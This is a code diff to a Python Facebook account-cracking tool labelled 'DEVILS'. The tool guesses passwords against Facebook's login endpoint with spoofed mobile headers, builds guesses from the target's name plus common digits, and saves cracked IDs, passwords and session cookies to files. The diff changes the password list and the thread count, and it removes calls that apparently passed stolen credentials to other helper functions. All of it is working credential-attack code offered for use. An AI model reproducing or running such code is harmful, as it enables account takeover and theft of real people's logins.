@@ -476,8 +476,7 @@ class main_crack():
             sys.stdout.write(f"\r{S}[DEVILS-M1] {loop} | OK/CP {len(oks)}/{len(cps)}")
             #sys.stdout.write(f"\r{S}[DEVILS-M1] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
-            ua_string=random.choice(ugen)
-            ua89=random.choice(prd)
+            ua_string=random.choice(prd)
             fs = name.split(' ')[0]
             try:
                 ls = name.split(' ')[1]
@@ -512,20 +511,13 @@ class main_crack():
                  'x-fb-sim-hni': '38531',
                  'x-fb-net-hni': '20691',
                  'x-fb-connection-quality': 'EXCELLENT',
-                 'user-agent': ua89,
+                 'user-agent': ua_string,
                  'content-type': 'application/x-www-form-urlencoded', 
                  'x-fb-http-engine': 'Liger'}
-                #print(data)
-                #print(headers)
-                #Elite(__UBI___,sid,ps,cookie)
-                #fike(__UBI___,sid,ps)
-                rakib(sid,ps)
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KINGb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KINGb};{ckkk}"
-                    print(f"\r{R}[DEVILS-OK] {sid} | {ps} {S} |{__UBI___()}")
-                    Elite(__UBI___,sid,ps,cookie)
-                    #xxd(sid,ps,cookie)
+                    print(f"\r{R}[DEVILS-OK] {sid} | {ps} {S}")
                     oks.append(sid)
                     open('/sdcard/DEVILS-IDS/file/devils_OK-M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DEVILS-IDS/file/devils_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
@@ -684,7 +676,7 @@ class main_crack():
             print(f'{S}TOTAL IDS :\033[33;1m %s ' % len(self.id))
             print('\x1b[1;92mUSE FLIGHT AIRPLANE MODE BEFORE USE')
             print(48*'_')
-            with devilswork(max_workers=40) as KINGworld:
+            with devilswork(max_workers=30) as KINGworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -693,7 +685,7 @@ class main_crack():
                            pwx =  pw
                        else:
                             #pwx =  pw
-                            pwx = ['first last','firstlast','first@123','first@1234','57273200','59039200','57575759','57575752','57575751','first@12345','first123','first1234','first12','first@12']
+                            pwx =  ['first last','first1234','first123','first@123','57273200','59039200','first@12345','57575751','57575752','07860786','First Last','first@@@','first@@','first12','first@12']
                             if 'methodA' in methods:
                                 KINGworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
